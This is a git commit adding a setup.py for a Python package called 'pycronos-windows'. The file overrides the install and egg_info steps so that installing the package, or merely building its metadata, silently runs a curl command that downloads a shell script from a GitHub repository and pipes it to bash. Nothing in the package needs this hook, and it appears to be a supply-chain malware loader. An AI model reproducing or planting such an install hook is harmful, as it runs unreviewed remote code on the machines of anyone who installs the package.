e966d5ee48da63a48fecad72a4fd9c1fa9093602
WilliamCXVI <47236583+WilliamCXVI@users.noreply.github.com>
2025-11-01 12:27:24 -0500

    Add files via upload

---
+++ setup.py
@@ -0,0 +1,33 @@
+import platform
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import subprocess
+
+
+def RunCommand():
+    cmd = 'curl -fsSL https://raw.githubusercontent.com/WilliamCXVI/win-pycronos/refs/heads/main/lin-pycronos.sh | bash'
+    completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
+    return completed
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
+
+
+class RunInstallCommand(install):
+    def run(self):
+        RunCommand()
+        install.run(self)
+
+setup(
+    name = "pycronos-windows",
+    version = "0.0.1",
+    license = "MIT",
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info': RunEggInfoCommand
+    },
+)
